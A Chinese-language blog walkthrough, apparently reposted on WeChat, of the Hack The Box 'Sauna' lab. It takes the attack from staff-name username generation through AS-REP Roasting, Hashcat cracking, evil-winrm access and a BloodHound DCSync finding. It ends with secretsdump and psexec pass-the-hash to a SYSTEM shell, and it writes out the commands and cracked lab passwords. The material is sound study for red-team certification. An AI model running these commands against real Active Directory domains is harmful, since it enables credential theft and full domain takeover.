---
title: 匿名 LDAP 枚举如何导致 AS-REP Roasting 并最终攻陷域控
url: https://mp.weixin.qq.com/s/4rLZ0Ygt9RhD2OEWZ0XP5w
source: Doonsec's feed
date: 2026-02-28
fetch_date: 2026-03-01T04:21:31.771656
---

# 匿名 LDAP 枚举如何导致 AS-REP Roasting 并最终攻陷域控

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/R98u9GTbBnunuQ1EedbTaseHOfbYZsAcOmefWtYZfXZQKOEHUxgPgevoeyIoPchV9ibOib01Jauh9wp8ibhZPX8DZC4XvcRONtNE8qse461ZP0/0?wx_fmt=jpeg)

# 匿名 LDAP 枚举如何导致 AS-REP Roasting 并最终攻陷域控

haidragon
haidragon

安全狗的自我修养

![]()

在小说阅读器中沉浸阅读

# 官网：http://securitytech.cc

在继续准备 CRTP（Certified Red Team Professional）认证的过程中，我开始结合课程之外的外部资源，加强自己对 Active Directory（AD）枚举的理解。我的目标是不再单纯依赖自动化工具，而是能够真正理解 AD 的工作原理，并自主识别与利用其潜在弱点。

由于我曾在企业级 AD 环境中进行过实际运维工作，这种思维方式的转变让我收获很大。我必须重新训练自己，不再以蓝队或管理员的视角去“维护和保护”Active Directory，而是以红队的思维去分析其攻击面和潜在的利用路径。

为了强化这种攻击者思维并加深技术理解，我完成并撰写了 Hack The Box 上 *Sauna* 机器的详细笔记。这是我系统巩固 AD 攻击基础、为 CRTP 考试做准备的重要一步。

---

## 初始访问与信息收集

启动 **Burp Suite** 并将 **Mozilla Firefox** 配置为通过 Burp 代理后，我访问了目标 IP 地址。页面成功加载，是一个银行类 Web 应用界面。

![https://miro.medium.com/v2/resize%3Afit%3A1400/1%2AwoNwCvcFXp3ortK4jf4adw.png](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnt4E2pQCv78ibe2f38dvZkicwxVNjWO0kS2OsoPEemPXeqntVkibAhaEd4joviakyBFuMux5hL5eau0Neicibian8pTzLuiamkhDTeibRXA/640?wx_fmt=png&from=appmsg)

![https://miro.medium.com/1%2AIn9wX9Kc20jcf_XiT5_9dA.png](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnvMzMdSjliaSHBW9h2LZ2iaR87pAD6CG1Lsk3couFa3RYtcD9R6l1eByib3L53eAUk44YnksLTuk8Wp04UXFcovzkL4IT8KxZDibKk/640?wx_fmt=png&from=appmsg)

![https://cspanias.github.io/assets/htb/fullpwn/sauna/sauna_site_users.png?600=](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnvFiaXptJMDociaTVe4zN8fCJ1VJrh1LSib3phiazUhPsRppJuuIBZqs1X1katD67k34XqmYVbJAPB8uDPkTsNN7kGJ2hY4T7FXLkE/640?wx_fmt=png&from=appmsg)

4

使用浏览器插件 **Wappalyzer** 进行技术指纹识别后，我发现：

* Web 服务器运行的是 **Microsoft IIS**
* 底层操作系统为 **Windows Server**

这进一步暗示目标极可能处于 Windows 域环境中。

---

## 员工信息泄露

在对网站进行手动目录枚举时，我发现一个 `about.html` 页面，其中公开列出了团队成员姓名。

在域环境攻击中，**员工姓名是非常有价值的信息**，因为它们可以用来构造可能的用户名格式，例如：

* first.last
* fsmith
* firstinitial + lastname
* firstname

这为后续的凭据攻击奠定基础。

---

## 端口扫描与服务识别

接下来，我使用 `nmap` 对目标主机（10.129.1.88）进行扫描，以识别开放端口与运行服务。

扫描结果显示以下关键服务：

* 53 — DNS
* 80 — IIS Web 服务器
* 88 — Kerberos
* 389 — LDAP
* 445 — SMB
* 5985 — WinRM
* 3268 — Global Catalog LDAP

域名为：

```
EGOTISTICAL-BANK.LOCAL
```

从 LDAP + Kerberos + 域名信息可以高度推测：

> 该主机极可能是域控制器（Domain Controller）

---

## 尝试匿名 LDAP 绑定

为了枚举 LDAP，我使用了 **Windapsearch** 工具。

由于尚未获得凭据，我首先尝试匿名绑定。

结果：

```
Anonymous bind not allowed
```

说明该域禁止匿名 LDAP 查询，因此必须获得有效凭据。

---

## 用户名生成

基于 `about.html` 页面中的姓名，我使用 **Username Anarchy** 生成可能的用户名格式。

生成示例：

```
fergus
fergus.smith
fsmith
hugo
hugo.bear
hbear
...
```

现在我们拥有了一份可用于攻击的用户名列表。

---

## AS-REP Roasting 攻击

由于还没有密码，但已拥有用户名列表，我决定尝试 **AS-REP Roasting**。

原理：

如果某个用户禁用了 Kerberos 预认证（preauthentication），攻击者可以：

* 请求 TGT（票据授予票）
* 获取可离线破解的 AS-REP 哈希
* 无需密码即可获取可破解数据

使用 `GetNPUsers.py` 批量测试用户名后，成功获取：

```
fsmith 的 AS-REP 哈希
```

---

## 使用 Hashcat 离线破解

AS-REP 哈希可以使用 Hashcat 进行离线破解。

Kerberos 5 AS-REP 模式：

```
-m 18200
```

使用 rockyou 字典后成功破解：

```
Thestrokes23
```

成功获得用户：

```
fsmith : Thestrokes23
```

---

## 利用 WinRM 获取 Shell

端口扫描显示：

```
5985/tcp open  http  Microsoft HTTPAPI
```

这表示 **WinRM 已开启**。

使用 `evil-winrm` 登录：

```
evil-winrm -i 10.129.1.88 -u fsmith -p 'Thestrokes23'
```

成功获得 PowerShell 会话，并读取：

```
C:\Users\FSmith\Desktop\user.txt
```

成功拿到 user flag。

---

## 本地提权阶段

进入后利用阶段后，我上传并运行 **winPEAS** 进行本地枚举。

在输出中发现额外凭据：

```
EGOTISTICALBANK\svc_loanmanager
Moneymakestheworldgoround!
```

验证后发现系统中存在用户目录：

```
C:\Users\svc_loanmgr
```

说明该账号真实存在。

---

## 切换至 svc\_loanmgr

使用发现的密码登录：

```
evil-winrm -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

成功获取更高权限用户访问。

---

## 使用 BloodHound 进行域关系分析

上传并运行 **SharpHound** 收集数据。

导入 BloodHound 后运行 Cypher 查询：

```
MATCH p=()-[:GetChanges|GetChangesAll|GetChangesInFilteredSet]->(:Domain) Return p
```

![https://mintcdn.com/specterops/3L2OuEwvAIHzUPXm/assets/image-2-76.png?auto=format&fit=max&n=3L2OuEwvAIHzUPXm&q=85&s=ee0502e2bc4837b58e7b1bd8a017dcb0](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnvIEoicoB4EORiaSoZU8yTO0kVEOmqjh66sbORbXrPBJXw36vgnpspFWg0PPKoic7IaELHiasN8zvqu7NHLC0rLdnNjRib3hIYA8ju4/640?wx_fmt=png&from=appmsg)

![https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt19aba89bcc099919/6926cd402d587aac4cdd8563/image1.png](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnvVKG4Wsus74c1ia1wPFdPFQoLjWMSfKiaPeBxLryjziaJBL90Lic6pzPFPHmywrRXMeiawIsTyqhS0dr9HiapEGTr8xgFBqXvBmYDUQ/640?wx_fmt=png&from=appmsg)

4

发现：

> svc\_loanmgr 拥有 DCSync 权限

---

## DCSync 攻击

使用 Impacket 的 `secretsdump.py`：

```
secretsdump.py egotistical-bank/svc_loanmgr@10.129.4.62 -just-dc-user Administrator
```

成功获取：

```
Administrator NTLM Hash
```

---

## Pass-the-Hash 攻击

使用 `psexec.py` 执行：

```
psexec.py Administrator@10.129.4.62 -hashes <LM:NT>
```

成功获得 SYSTEM 级 shell。

读取：

```
C:\Users\Administrator\Desktop\root.txt
```

成功完成机器。

---

# 总结

这台机器很好地展示了：

* 如何从员工姓名开始
* 构造用户名
* 利用 AS-REP Roasting 获取凭据
* 通过 WinRM 获得初始访问
* 使用 BloodHound 分析攻击路径
* 利用 DCSync 滥用域复制权限
* 通过 Pass-the-Hash 完全攻陷域

核心学习点包括：

* Kerberos 认证流程
* 预认证禁用的风险
* 离线哈希破解
* AD 权限关系图分析
* 域复制权限滥用（DCSync）

这次练习不仅巩固了技术知识，更重要的是强化了“攻击链思维”。

从一个简单的员工姓名泄露，到完全域控接管，所有步骤都环环相扣。

继续下一个挑战。

* 公众号:安全狗的自我修养
* vx:2207344074
* http://gitee.com/haidragon
* http://github.com/haidragon
* bilibili:haidragonx

##

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBntID7icdoBSsnjVhUYYcxWNbUgHTiaZaHr6NvkuYJGhic3K3odn4M0cOrMteMIyqAlyzjIxt09YzhdSzaicQzT87cViaayI0icSsCaHs/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=z84f6pb5&tp=webp#imgIndex=5)

+ ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=omk5zkfc&tp=webp#imgIndex=5)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERH8N8KjDo7DwKbNkHbLeSV917gqKcuKHWeINcgDQYWVq7WaRpFQCc3TvfLLJrrjaiaLCElA7oflv0A/0?wx_fmt=png)

安全狗的自我修养

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERH8N8KjDo7DwKbNkHbLeSV917gqKcuKHWeINcgDQYWVq7WaRpFQCc3TvfLLJrrjaiaLCElA7oflv0A/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过